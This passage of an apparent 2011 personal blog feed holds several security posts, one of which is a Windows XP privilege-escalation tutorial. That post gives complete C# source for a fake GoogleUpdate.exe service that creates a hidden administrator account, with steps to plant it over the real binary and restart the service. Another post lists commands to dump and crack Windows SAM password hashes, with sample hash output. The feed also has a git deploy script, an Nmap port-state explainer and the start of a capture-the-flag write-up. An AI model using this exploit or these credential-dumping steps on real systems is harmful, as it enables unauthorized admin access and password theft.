cp -r _site/* . &amp;amp;&amp;amp; rm -rf _site/ &amp;amp;&amp;amp; touch .nojekyll

echo &amp;quot;Adding the content&amp;quot;
git add .

echo &amp;quot;Updated content&amp;quot;
git commit -am &amp;quot;Updated content&amp;quot;

echo &amp;quot;Pushed content&amp;quot;
git push --all origin
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;</content>
 </entry>
 
 <entry>
   <title>Privilege escalation on Windows using Binary Planting</title>
   <link href="http://madhur.co.in/blog/2011/09/23/privilegeescalation.html"/>
   <updated>2011-09-23T00:00:00+05:30</updated>
   <id>id:/blog/2011/09/23/privilegeescalation</id>
   <content type="html">&lt;p&gt;This article is a tutorial on how to trick Windows XP into giving you system privileges using Binary Planting. There have been other previlege escalation methods which are no longer useable:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href='http://h0bbel.p0ggel.org/windows-xp-privilege-escalation-exploit-no-it-isnt'&gt;Escalation using at command&lt;/a&gt;&lt;/li&gt;

&lt;li&gt;&lt;a href='http://technet.microsoft.com/en-us/security/bulletin/ms04-019'&gt;Escalation using Utilman.exe&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Microsoft Windows services, formerly known as NT services, enable you to create long-running executable applications that run in their own Windows sessions. These services can be automatically started when the computer boots, can be paused and restarted, and do not show any user interface. Each service executes in the security context of a user account.&lt;/p&gt;

&lt;p&gt;You can specify one of the following special accounts instead of specifying a user account for the service:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href='http://msdn.microsoft.com/en-us/library/ms684188.aspx'&gt;LocalService&lt;/a&gt;&lt;/li&gt;

&lt;li&gt;&lt;a href='http://msdn.microsoft.com/en-us/library/ms684272.aspx'&gt;NetworkService&lt;/a&gt;&lt;/li&gt;

&lt;li&gt;&lt;a href='http://msdn.microsoft.com/en-us/library/ms684190.aspx'&gt;LocalSystem&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;LocalSystem has extensive privileges on the local computer, and acts as the computer on the network. Its token includes the NT AUTHORITY\SYSTEM and BUILTIN\Administrators SIDs; these accounts have access to most system objects.&lt;/p&gt;

&lt;p&gt;If you open &lt;em&gt;services.msc&lt;/em&gt; you can see many Windows services running with &lt;strong&gt;LocalSystem&lt;/strong&gt; account. Most of the Windows services run under the process svchost.exe by supplying different command line parameters to it. Now imagine what will happen if we replace svchost.exe with our own custom &lt;em&gt;svchost.exe&lt;/em&gt; having malicious code. This file replacement will result in privelege escalation and execution of exploit code. This can even happen remotely if you are able to connect to remote machine and replace &lt;em&gt;svchost.exe&lt;/em&gt;. Fortunately, &lt;em&gt;svchost.exe&lt;/em&gt; and many of the Windows critical executables are protected by &lt;a href='http://en.wikipedia.org/wiki/Windows_File_Protection'&gt;Windows File Protection&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;img alt='' src='/images/Blog/services.png' /&gt;&lt;/p&gt;

&lt;p&gt;However, depending on your computer configuration, there will be some other 3rd party services which have been installed and run under the different process. For example, in the screenshot below there is a service called &lt;strong&gt;Google Update service&lt;/strong&gt; which runs under LocalSystem account in the process &lt;strong&gt;GoogleUpdate.exe&lt;/strong&gt;. This process is generally called from this location &lt;strong&gt;C:\Program Files\Google\GoogleUpdate.exe&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img alt='' src='/images/Blog/gpupdate.png' /&gt;&lt;/p&gt;

&lt;p&gt;Now, even as a restricted user, nobody is stopping me from deleting or replacing this file. If we replace this &lt;strong&gt;GoogleUpdate.exe&lt;/strong&gt; with the malicious one and then restart the Google Update Services, no file integrity check is performed by OS or Google Update Services to verify that file being executed is original or malicious. This makes the system vulnerable to be exploited since we can run any malicious code under System account simply by replacing this file and then executing the service, which can be done as restricted user.&lt;/p&gt;

&lt;p&gt;&lt;img alt='' src='/images/Blog/gservice.png' /&gt;&lt;/p&gt;

&lt;p&gt;Here is a simple Windows Service code which produces the executable called &lt;strong&gt;GoogleUpdate.exe&lt;/strong&gt; , creates a user and adds it to the Administrators group.&lt;/p&gt;
&lt;div class='highlight'&gt;&lt;pre&gt;&lt;code class='csharp'&gt;&lt;span class='k'&gt;namespace&lt;/span&gt; &lt;span class='nn'&gt;Google.MakeAdmin.Exploit&lt;/span&gt;
&lt;span class='p'&gt;{&lt;/span&gt;
    &lt;span class='k'&gt;using&lt;/span&gt; &lt;span class='nn'&gt;System&lt;/span&gt;&lt;span class='p'&gt;;&lt;/span&gt;
    &lt;span class='k'&gt;using&lt;/span&gt; &lt;span class='nn'&gt;System.Diagnostics&lt;/span&gt;&lt;span class='p'&gt;;&lt;/span&gt;
    &lt;span class='k'&gt;using&lt;/span&gt; &lt;span class='nn'&gt;System.ServiceProcess&lt;/span&gt;&lt;span class='p'&gt;;&lt;/span&gt;
    &lt;span class='k'&gt;using&lt;/span&gt; &lt;span class='nn'&gt;System.DirectoryServices&lt;/span&gt;&lt;span class='p'&gt;;&lt;/span&gt;

    &lt;span class='k'&gt;public&lt;/span&gt; &lt;span class='k'&gt;partial&lt;/span&gt; &lt;span class='k'&gt;class&lt;/span&gt; &lt;span class='nc'&gt;MakeAdmin&lt;/span&gt; &lt;span class='p'&gt;:&lt;/span&gt; &lt;span class='n'&gt;ServiceBase&lt;/span&gt;
    &lt;span class='p'&gt;{&lt;/span&gt;
        &lt;span class='k'&gt;private&lt;/span&gt; &lt;span class='k'&gt;readonly&lt;/span&gt; &lt;span class='kt'&gt;string&lt;/span&gt; &lt;span class='n'&gt;sSource&lt;/span&gt;&lt;span class='p'&gt;;&lt;/span&gt;
        &lt;span class='k'&gt;private&lt;/span&gt; &lt;span class='k'&gt;readonly&lt;/span&gt; &lt;span class='kt'&gt;string&lt;/span&gt; &lt;span class='n'&gt;sLog&lt;/span&gt;&lt;span class='p'&gt;;&lt;/span&gt;        

        &lt;span class='c1'&gt;/// &amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span class='c1'&gt;/// Initializes a new instance of the &amp;lt;see cref=&amp;quot;MakeAdmin&amp;quot;/&amp;gt; class.&lt;/span&gt;
        &lt;span class='c1'&gt;/// &amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span class='k'&gt;public&lt;/span&gt; &lt;span class='nf'&gt;MakeAdmin&lt;/span&gt;&lt;span class='p'&gt;()&lt;/span&gt;
        &lt;span class='p'&gt;{&lt;/span&gt;
            &lt;span class='n'&gt;InitializeComponent&lt;/span&gt;&lt;span class='p'&gt;();&lt;/span&gt;
            &lt;span class='n'&gt;sSource&lt;/span&gt; &lt;span class='p'&gt;=&lt;/span&gt; &lt;span class='s'&gt;&amp;quot;Google.MakeAdmin.Exploit&amp;quot;&lt;/span&gt;&lt;span class='p'&gt;;&lt;/span&gt;
            &lt;span class='n'&gt;sLog&lt;/span&gt; &lt;span class='p'&gt;=&lt;/span&gt; &lt;span class='s'&gt;&amp;quot;Application&amp;quot;&lt;/span&gt;&lt;span class='p'&gt;;&lt;/span&gt;
        &lt;span class='p'&gt;}&lt;/span&gt;

        &lt;span class='c1'&gt;/// &amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span class='c1'&gt;/// When implemented in a derived class, executes when a Start command is sent to the service by the &lt;/span&gt;
        &lt;span class='c1'&gt;/// Service Control Manager (SCM) or when the operating system starts (for a service that starts automatically). &lt;/span&gt;
        &lt;span class='c1'&gt;/// Specifies actions to take when the service starts.&lt;/span&gt;
        &lt;span class='c1'&gt;/// &amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span class='c1'&gt;/// &amp;lt;param name=&amp;quot;args&amp;quot;&amp;gt;Data passed by the start command.&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span class='k'&gt;protected&lt;/span&gt; &lt;span class='k'&gt;override&lt;/span&gt; &lt;span class='k'&gt;void&lt;/span&gt; &lt;span class='nf'&gt;OnStart&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='kt'&gt;string&lt;/span&gt;&lt;span class='p'&gt;[]&lt;/span&gt; &lt;span class='n'&gt;args&lt;/span&gt;&lt;span class='p'&gt;)&lt;/span&gt;
        &lt;span class='p'&gt;{&lt;/span&gt;
            &lt;span class='k'&gt;if&lt;/span&gt; &lt;span class='p'&gt;(!&lt;/span&gt;&lt;span class='n'&gt;EventLog&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;SourceExists&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='n'&gt;sSource&lt;/span&gt;&lt;span class='p'&gt;))&lt;/span&gt;
            &lt;span class='p'&gt;{&lt;/span&gt;
                &lt;span class='n'&gt;EventLog&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;CreateEventSource&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='n'&gt;sSource&lt;/span&gt;&lt;span class='p'&gt;,&lt;/span&gt; &lt;span class='n'&gt;sLog&lt;/span&gt;&lt;span class='p'&gt;);&lt;/span&gt;
            &lt;span class='p'&gt;}&lt;/span&gt;


            &lt;span class='k'&gt;const&lt;/span&gt; &lt;span class='kt'&gt;string&lt;/span&gt; &lt;span class='n'&gt;login&lt;/span&gt; &lt;span class='p'&gt;=&lt;/span&gt; &lt;span class='s'&gt;&amp;quot;superboy&amp;quot;&lt;/span&gt;&lt;span class='p'&gt;;&lt;/span&gt;
            &lt;span class='k'&gt;const&lt;/span&gt; &lt;span class='kt'&gt;string&lt;/span&gt; &lt;span class='n'&gt;password&lt;/span&gt; &lt;span class='p'&gt;=&lt;/span&gt; &lt;span class='s'&gt;&amp;quot;pass@word1&amp;quot;&lt;/span&gt;&lt;span class='p'&gt;;&lt;/span&gt;
            &lt;span class='k'&gt;const&lt;/span&gt; &lt;span class='kt'&gt;string&lt;/span&gt; &lt;span class='n'&gt;fullName&lt;/span&gt; &lt;span class='p'&gt;=&lt;/span&gt; &lt;span class='s'&gt;&amp;quot;Clark Kent&amp;quot;&lt;/span&gt;&lt;span class='p'&gt;;&lt;/span&gt;

            &lt;span class='n'&gt;CreateUserAccount&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='n'&gt;login&lt;/span&gt;&lt;span class='p'&gt;,&lt;/span&gt; &lt;span class='n'&gt;password&lt;/span&gt;&lt;span class='p'&gt;,&lt;/span&gt; &lt;span class='n'&gt;fullName&lt;/span&gt;&lt;span class='p'&gt;,&lt;/span&gt; &lt;span class='k'&gt;true&lt;/span&gt;&lt;span class='p'&gt;,&lt;/span&gt; &lt;span class='k'&gt;true&lt;/span&gt;&lt;span class='p'&gt;);&lt;/span&gt;

        &lt;span class='p'&gt;}&lt;/span&gt;

        &lt;span class='c1'&gt;/// &amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span class='c1'&gt;/// When implemented in a derived class, executes when a Stop command is sent to the service by the &lt;/span&gt;
        &lt;span class='c1'&gt;/// Service Control Manager (SCM). Specifies actions to take when a service stops running.&lt;/span&gt;
        &lt;span class='c1'&gt;/// &amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span class='k'&gt;protected&lt;/span&gt; &lt;span class='k'&gt;override&lt;/span&gt; &lt;span class='k'&gt;void&lt;/span&gt; &lt;span class='nf'&gt;OnStop&lt;/span&gt;&lt;span class='p'&gt;()&lt;/span&gt;
        &lt;span class='p'&gt;{&lt;/span&gt;
        &lt;span class='p'&gt;}&lt;/span&gt;

        &lt;span class='c1'&gt;/// &amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span class='c1'&gt;/// Creates the user account.&lt;/span&gt;
        &lt;span class='c1'&gt;/// &amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span class='c1'&gt;/// &amp;lt;param name=&amp;quot;login&amp;quot;&amp;gt;The login.&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span class='c1'&gt;/// &amp;lt;param name=&amp;quot;password&amp;quot;&amp;gt;The password.&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span class='c1'&gt;/// &amp;lt;param name=&amp;quot;fullName&amp;quot;&amp;gt;The full name.&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span class='c1'&gt;/// &amp;lt;param name=&amp;quot;isAdmin&amp;quot;&amp;gt;if set to &amp;lt;c&amp;gt;true&amp;lt;/c&amp;gt; [is admin].&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span class='c1'&gt;/// &amp;lt;param name=&amp;quot;isNew&amp;quot;&amp;gt;if set to &amp;lt;c&amp;gt;true&amp;lt;/c&amp;gt; [is new].&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span class='k'&gt;private&lt;/span&gt; &lt;span class='k'&gt;void&lt;/span&gt; &lt;span class='nf'&gt;CreateUserAccount&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='kt'&gt;string&lt;/span&gt; &lt;span class='n'&gt;login&lt;/span&gt;&lt;span class='p'&gt;,&lt;/span&gt; &lt;span class='kt'&gt;string&lt;/span&gt; &lt;span class='n'&gt;password&lt;/span&gt;&lt;span class='p'&gt;,&lt;/span&gt; &lt;span class='kt'&gt;string&lt;/span&gt; &lt;span class='n'&gt;fullName&lt;/span&gt;&lt;span class='p'&gt;,&lt;/span&gt; &lt;span class='kt'&gt;bool&lt;/span&gt; &lt;span class='n'&gt;isAdmin&lt;/span&gt;&lt;span class='p'&gt;,&lt;/span&gt; &lt;span class='kt'&gt;bool&lt;/span&gt; &lt;span class='n'&gt;isNew&lt;/span&gt;&lt;span class='p'&gt;)&lt;/span&gt;
        &lt;span class='p'&gt;{&lt;/span&gt;
            &lt;span class='k'&gt;try&lt;/span&gt;
            &lt;span class='p'&gt;{&lt;/span&gt;
                &lt;span class='n'&gt;DirectoryEntry&lt;/span&gt; &lt;span class='n'&gt;dirEntry&lt;/span&gt; &lt;span class='p'&gt;=&lt;/span&gt; &lt;span class='k'&gt;new&lt;/span&gt; &lt;span class='n'&gt;DirectoryEntry&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='s'&gt;&amp;quot;WinNT://&amp;quot;&lt;/span&gt; &lt;span class='p'&gt;+&lt;/span&gt; &lt;span class='n'&gt;Environment&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;MachineName&lt;/span&gt; &lt;span class='p'&gt;+&lt;/span&gt; &lt;span class='s'&gt;&amp;quot;,computer&amp;quot;&lt;/span&gt;&lt;span class='p'&gt;);&lt;/span&gt;
                &lt;span class='n'&gt;DirectoryEntries&lt;/span&gt; &lt;span class='n'&gt;entries&lt;/span&gt; &lt;span class='p'&gt;=&lt;/span&gt; &lt;span class='n'&gt;dirEntry&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;Children&lt;/span&gt;&lt;span class='p'&gt;;&lt;/span&gt;
                &lt;span class='n'&gt;DirectoryEntry&lt;/span&gt; &lt;span class='n'&gt;newUser&lt;/span&gt; &lt;span class='p'&gt;=&lt;/span&gt; &lt;span class='k'&gt;null&lt;/span&gt;&lt;span class='p'&gt;;&lt;/span&gt;
                &lt;span class='k'&gt;if&lt;/span&gt; &lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='n'&gt;isNew&lt;/span&gt;&lt;span class='p'&gt;)&lt;/span&gt;
                &lt;span class='p'&gt;{&lt;/span&gt;
                    &lt;span class='n'&gt;newUser&lt;/span&gt; &lt;span class='p'&gt;=&lt;/span&gt; &lt;span class='n'&gt;entries&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;Add&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='n'&gt;login&lt;/span&gt;&lt;span class='p'&gt;,&lt;/span&gt; &lt;span class='s'&gt;&amp;quot;user&amp;quot;&lt;/span&gt;&lt;span class='p'&gt;);&lt;/span&gt;
                &lt;span class='p'&gt;}&lt;/span&gt;
                &lt;span class='k'&gt;else&lt;/span&gt;
                &lt;span class='p'&gt;{&lt;/span&gt;
                    &lt;span class='n'&gt;newUser&lt;/span&gt; &lt;span class='p'&gt;=&lt;/span&gt; &lt;span class='n'&gt;entries&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;Find&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='n'&gt;login&lt;/span&gt;&lt;span class='p'&gt;,&lt;/span&gt; &lt;span class='s'&gt;&amp;quot;user&amp;quot;&lt;/span&gt;&lt;span class='p'&gt;);&lt;/span&gt;
                &lt;span class='p'&gt;}&lt;/span&gt;

                &lt;span class='n'&gt;newUser&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;Properties&lt;/span&gt;&lt;span class='p'&gt;[&lt;/span&gt;&lt;span class='s'&gt;&amp;quot;FullName&amp;quot;&lt;/span&gt;&lt;span class='p'&gt;].&lt;/span&gt;&lt;span class='n'&gt;Add&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='n'&gt;fullName&lt;/span&gt;&lt;span class='p'&gt;);&lt;/span&gt;
                &lt;span class='n'&gt;newUser&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;Invoke&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='s'&gt;&amp;quot;SetPassword&amp;quot;&lt;/span&gt;&lt;span class='p'&gt;,&lt;/span&gt; &lt;span class='n'&gt;password&lt;/span&gt;&lt;span class='p'&gt;);&lt;/span&gt;
                &lt;span class='n'&gt;newUser&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;CommitChanges&lt;/span&gt;&lt;span class='p'&gt;();&lt;/span&gt;

                &lt;span class='c1'&gt;// Remove the if condition along with the else to create user account in &amp;quot;user&amp;quot; group.&lt;/span&gt;
                &lt;span class='n'&gt;DirectoryEntry&lt;/span&gt; &lt;span class='n'&gt;grp&lt;/span&gt;&lt;span class='p'&gt;;&lt;/span&gt;
                &lt;span class='k'&gt;if&lt;/span&gt; &lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='n'&gt;isAdmin&lt;/span&gt;&lt;span class='p'&gt;)&lt;/span&gt;
                &lt;span class='p'&gt;{&lt;/span&gt;
                    &lt;span class='n'&gt;grp&lt;/span&gt; &lt;span class='p'&gt;=&lt;/span&gt; &lt;span class='n'&gt;dirEntry&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;Children&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;Find&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='s'&gt;&amp;quot;Administrators&amp;quot;&lt;/span&gt;&lt;span class='p'&gt;,&lt;/span&gt; &lt;span class='s'&gt;&amp;quot;group&amp;quot;&lt;/span&gt;&lt;span class='p'&gt;);&lt;/span&gt;
                    &lt;span class='k'&gt;if&lt;/span&gt; &lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='n'&gt;grp&lt;/span&gt; &lt;span class='p'&gt;!=&lt;/span&gt; &lt;span class='k'&gt;null&lt;/span&gt;&lt;span class='p'&gt;)&lt;/span&gt;
                    &lt;span class='p'&gt;{&lt;/span&gt;
                        &lt;span class='n'&gt;grp&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;Invoke&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='s'&gt;&amp;quot;Add&amp;quot;&lt;/span&gt;&lt;span class='p'&gt;,&lt;/span&gt; &lt;span class='k'&gt;new&lt;/span&gt; &lt;span class='kt'&gt;object&lt;/span&gt;&lt;span class='p'&gt;[]&lt;/span&gt; &lt;span class='p'&gt;{&lt;/span&gt;&lt;span class='n'&gt;newUser&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;Path&lt;/span&gt;&lt;span class='p'&gt;});&lt;/span&gt;
                    &lt;span class='p'&gt;}&lt;/span&gt;
                &lt;span class='p'&gt;}&lt;/span&gt;
                &lt;span class='k'&gt;else&lt;/span&gt;
                &lt;span class='p'&gt;{&lt;/span&gt;
                    &lt;span class='n'&gt;grp&lt;/span&gt; &lt;span class='p'&gt;=&lt;/span&gt; &lt;span class='n'&gt;dirEntry&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;Children&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;Find&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='s'&gt;&amp;quot;Guests&amp;quot;&lt;/span&gt;&lt;span class='p'&gt;,&lt;/span&gt; &lt;span class='s'&gt;&amp;quot;group&amp;quot;&lt;/span&gt;&lt;span class='p'&gt;);&lt;/span&gt;
                    &lt;span class='k'&gt;if&lt;/span&gt; &lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='n'&gt;grp&lt;/span&gt; &lt;span class='p'&gt;!=&lt;/span&gt; &lt;span class='k'&gt;null&lt;/span&gt;&lt;span class='p'&gt;)&lt;/span&gt;
                    &lt;span class='p'&gt;{&lt;/span&gt;
                        &lt;span class='n'&gt;grp&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;Invoke&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='s'&gt;&amp;quot;Add&amp;quot;&lt;/span&gt;&lt;span class='p'&gt;,&lt;/span&gt; &lt;span class='k'&gt;new&lt;/span&gt; &lt;span class='kt'&gt;object&lt;/span&gt;&lt;span class='p'&gt;[]&lt;/span&gt; &lt;span class='p'&gt;{&lt;/span&gt;&lt;span class='n'&gt;newUser&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;Path&lt;/span&gt;&lt;span class='p'&gt;});&lt;/span&gt;
                    &lt;span class='p'&gt;}&lt;/span&gt;
                &lt;span class='p'&gt;}&lt;/span&gt;

            &lt;span class='p'&gt;}&lt;/span&gt;
            &lt;span class='k'&gt;catch&lt;/span&gt; &lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='n'&gt;Exception&lt;/span&gt; &lt;span class='n'&gt;ex&lt;/span&gt;&lt;span class='p'&gt;)&lt;/span&gt;
            &lt;span class='p'&gt;{&lt;/span&gt;
                &lt;span class='n'&gt;EventLog&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;WriteEntry&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='n'&gt;sSource&lt;/span&gt;&lt;span class='p'&gt;,&lt;/span&gt; &lt;span class='n'&gt;ex&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;Message&lt;/span&gt;&lt;span class='p'&gt;);&lt;/span&gt;
            &lt;span class='p'&gt;}&lt;/span&gt;
        &lt;span class='p'&gt;}&lt;/span&gt;
    &lt;span class='p'&gt;}&lt;/span&gt;
&lt;span class='p'&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;h2 id='exploiting_the_service_running_with_localsystem_account'&gt;Exploiting the Service running with LocalSystem Account&lt;/h2&gt;

&lt;ol&gt;
&lt;li&gt;Compile the file to generate a new service executable named &lt;strong&gt;GoogleUpdate.exe&lt;/strong&gt; and replace it with the original file stored at the location &lt;strong&gt;C:\Program Files\Google\GoogleUpdate.exe&lt;/strong&gt;&lt;/li&gt;

&lt;li&gt;Restart the service. This will cause our exploit code to be executed and a new user will be created in the system with Administrator privileges. In my example, user will have login name &lt;em&gt;superboy&lt;/em&gt; and password &lt;em&gt;pass@word1&lt;/em&gt;.&lt;/li&gt;

&lt;li&gt;Try to run the command prompt with the credentials of new user. &lt;img alt='' src='/images/Blog/runcmd.png' /&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;img alt='' src='/images/Blog/login.png' /&gt;&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;The command prompt executed is under the credentials of superboy and has superuser access.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;The exploit code can be downloaded from &lt;a href='https://github.com/madhur/Google.MakeAdmin.Exploit'&gt;this&lt;/a&gt; github repository.&lt;/p&gt;</content>
 </entry>
 
 <entry>
   <title>Difference between Filtered vs Closed Ports</title>
   <link href="http://madhur.co.in/blog/2011/09/18/filteredclosed.html"/>
   <updated>2011-09-18T00:00:00+05:30</updated>
   <id>id:/blog/2011/09/18/filteredclosed</id>
   <content type="html">&lt;p&gt;Often during Nmap scanning techniques, you will find the port state as either &lt;strong&gt;open&lt;/strong&gt; or &lt;strong&gt;filtered&lt;/strong&gt;&lt;/p&gt;
&lt;div class='highlight'&gt;&lt;pre&gt;&lt;code class='text'&gt;PORT      STATE    SERVICE
22/tcp    open     ssh
443/tcp   open     https
1024/tcp  filtered kdm
1084/tcp  filtered ansoft-lm-2
1863/tcp  filtered msnp
3128/tcp  open     squid-http
3333/tcp  filtered dec-notes
4900/tcp  filtered hfcs
9943/tcp  filtered unknown
30000/tcp open     unknown
38292/tcp filtered landesk-cba
40911/tcp filtered unknown
52673/tcp filtered unknown
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;What exactly is the difference between two ?&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Closed Port&lt;/strong&gt;: If you send a SYN to a closed port, it will respond back with a RST.&lt;/li&gt;

&lt;li&gt;&lt;strong&gt;Filtered Port&lt;/strong&gt;: Presumably, the host is behind some sort of firewall. Here, the packet is simply dropped and you receive no response (not even a RST).&lt;/li&gt;

&lt;li&gt;&lt;strong&gt;Open Port&lt;/strong&gt;: If you send a SYN to an open port, you would expect to receive SYN/ACK.&lt;/li&gt;
&lt;/ul&gt;</content>
 </entry>
 
 <entry>
   <title>Crack or Reset Windows Passwords</title>
   <link href="http://madhur.co.in/blog/2011/09/18/crackresetwindows.html"/>
   <updated>2011-09-18T00:00:00+05:30</updated>
   <id>id:/blog/2011/09/18/crackresetwindows</id>
   <content type="html">&lt;p&gt;If you have forgotten the Windows Administrator password, you can either reset or even crack it. Windows XP stored it username and password information in file named SAM at %SystemDrive%:\Windows\system32\config. The SAM file is encrypted using LM hashes, which is vulnerable to rainbow table attack and bruteforce attack.&lt;/p&gt;

&lt;p&gt;I am going to do this with already available tools in Backtrack.&lt;/p&gt;
&lt;div class='highlight'&gt;&lt;pre&gt;&lt;code class='text'&gt;cd /mnt/hda1/WINDOWS/system32/config/
bkhive system key
samdump2 SAM key &amp;gt; /root/pass1
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;This will dump the hashes in /root/pass1 file as shown below&lt;/p&gt;
&lt;div class='highlight'&gt;&lt;pre&gt;&lt;code class='text'&gt;Root Key : CMI-CreateHive{C4E7BA2B-68E8-499C-B1A1-371AC8D717C7}
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
madhurdesk:1000:aad3b435b51404eeaad3b435b51404ee:ba03a114def8d5c913983436960e592c:::
HomeGroupUser$:1002:aad3b435b51404eeaad3b435b51404ee:cdaac87aeeac96724b4a2af3c4879242:::
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;Cracking using John the ripper,&lt;/p&gt;
&lt;div class='highlight'&gt;&lt;pre&gt;&lt;code class='text'&gt;john --format=NT /root/pass1
Loaded 1 password hash (NT MD4 [128/128 SSE2 + 32/32])
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;Or, you can directly reset it with chntpw&lt;/p&gt;
&lt;div class='highlight'&gt;&lt;pre&gt;&lt;code class='text'&gt;/pentest/password/chntpw -u administrator SAM
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;</content>
 </entry>
 
 <entry>
   <title>HackingLab Challenge: Disassemble .NET Clients</title>
   <link href="http://madhur.co.in/blog/2011/09/10/hackchallenge.html"/>
   <updated>2011-09-10T00:00:00+05:30</updated>
   <id>id:/blog/2011/09/10/hackchallenge</id>
   <content type="html">&lt;p&gt;Compass Security has come up with a hacking challenge on their &lt;a href='https://www.hacking-lab.com/sh/LAE04Jf'&gt;site&lt;/a&gt;. The challenge consist of an .NET client having some hidden functionality which needs to be uncovered by the user. I decided to give it a try.&lt;/p&gt;

&lt;h2 id='requirements'&gt;Requirements&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;Download &lt;a href='http://media.hacking-lab.com/largefiles/7205/DotNetFatClientHacking.exe'&gt;Application: DotNetFatClientHacking.exe&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id='tools_used_in_the_trade'&gt;Tools used in the trade&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href='http://www.reflector.net/'&gt;Reflector&lt;/a&gt; or now better &lt;a href='http://www.jetbrains.com/decompiler/'&gt;DotPeek&lt;/a&gt;&lt;/li&gt;

&lt;li&gt;ILDasm&lt;/li&gt;

&lt;li&gt;Hex Editor&lt;/li&gt;

&lt;li&gt;MSDN&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id='solution'&gt;Solution&lt;/h2&gt;

&lt;p&gt;Let&amp;#8217;s run our .NET assembly and see what it looks like. Its a normal Windows Form application with just one button which does nothing. I could not figure out anything else from the application.&lt;/p&gt;

